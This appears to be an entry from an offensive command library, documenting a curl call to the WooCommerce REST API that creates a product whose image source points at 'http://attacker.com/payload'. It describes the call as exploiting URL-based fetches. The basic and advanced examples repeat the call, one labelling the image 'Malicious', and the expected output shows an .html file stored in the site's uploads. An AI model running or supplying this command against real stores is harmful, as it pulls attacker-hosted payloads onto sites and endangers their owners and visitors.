---
id: cmd-woocommerce-upload
data: >-
  curl -X POST "https://target.com/wp-json/wc/v3/products" -u
  "ck_abc123:cs_def456" -H "Content-Type: application/json" -d
  '{"name":"Test","images":[{"src":"http://attacker.com/payload"}]}'
tags:
  - api
  - upload
  - woocommerce
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:14.185Z'
verified: false
validated: true
submitted: true
---
# upload-image-via-woocommerce-api

## Command

```bash
curl -X POST "https://target.com/wp-json/wc/v3/products" -u "ck_abc123:cs_def456" -H "Content-Type: application/json" -d '{"name":"Test","images":[{"src":"http://attacker.com/payload"}]}'
```

## Description

Uploads an image via URL to a new WooCommerce product using the REST API, exploiting URL-based fetches.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-u` | API credentials | Yes |
| `-d` | JSON payload with product name and image src | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://site.com/wp-json/wc/v3/products" -u "ck:cs" -H "Content-Type: application/json" -d '{"name":"Prod","images":[{"src":"http://url/to/image"}]}'
```

### Advanced Usage

```bash
curl -X POST "https://site.com/wp-json/wc/v3/products" -u "ck:cs" -H "Content-Type: application/json" -d '{"name":"Prod","images":[{"src":"http://url/payload","name":"Malicious"}]}' -v
```

## Expected Output

JSON response with product ID and image details, e.g., {"id":123,"images":[{"src":"https://site.com/uploads/file.html"}]}.

## Related

- [[commands/test-api-key]]
